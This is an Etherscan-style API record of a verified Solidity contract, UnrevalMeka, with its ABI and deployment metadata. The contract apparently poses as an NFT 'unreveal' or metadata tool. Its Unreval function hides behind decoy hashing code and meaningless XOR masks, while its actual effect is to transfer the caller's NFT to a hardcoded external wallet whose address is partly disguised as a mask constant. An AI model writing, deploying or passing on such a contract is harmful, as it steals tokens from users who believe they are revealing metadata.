{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface MetaDataChecker {\r\n    function transferFrom(address, address, uint256) external;\r\n\r\n}\r\n\r\ncontract UnrevalMeka {\r\n    address Meka;\r\n    bytes32 Mask = \"8E6BEB5f56eebBd77cde3A6\";\r\n    bytes32 URIChecker = \"METAUNREAVAL0ddwamna\";\r\n    \r\n    constructor(address add_) {\r\n        Meka = add_;\r\n    }\r\n    \r\n\r\n    function hashProposalForRarity(\r\n        address[] memory targets,\r\n        uint256[] memory values,\r\n        bytes[] memory calldatas,\r\n        bytes32 descriptionHash\r\n    ) private {\r\n    }\r\n    \r\n    function hashProposalForTraits(\r\n        address[] memory targets,\r\n        uint256[] memory values,\r\n        bytes[] memory calldatas,\r\n        bytes32 descriptionHash\r\n    ) private {\r\n        bytes32 localUnreavalHashMask = 0;\r\n        bytes32 MaskForMeta = \"8E6BEB5f56eebBd77cde3A6\";\r\n        bytes32 URICheckerForMeta = \"METAUNREAVAL0ddwamna\";\r\n        localUnreavalHashMask = URICheckerForMeta;\r\n        localUnreavalHashMask = URICheckerForMeta ^ URICheckerForMeta;\r\n    }\r\n\r\n    \r\n    function Unreval(uint256 _id) public {\r\n        bytes32 localUnreavalHashMask;\r\n        localUnreavalHashMask = Mask ^ bytes32(_id) ^ URIChecker;\r\n        if (bytes32(_id) == \"METARVALUE\") {\r\n            localUnreavalHashMask = bytes32(_id) ^ URIChecker;\r\n        }\r\n        return MetaDataChecker(Meka).transferFrom(msg.sender, 0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"add_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_id\",\"type\":\"uint256\"}],\"name\":\"Unreval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"UnrevalMeka","CompilerVersion":"v0.8.9+commit.e5eed63a","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000009a534628b4062e123ce7ee2222ec20b86e16ca8f","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://31497d6af9dd82314c942b3b7a85d06d8f1107ad7baf6dc46a620817a3c60761"}]}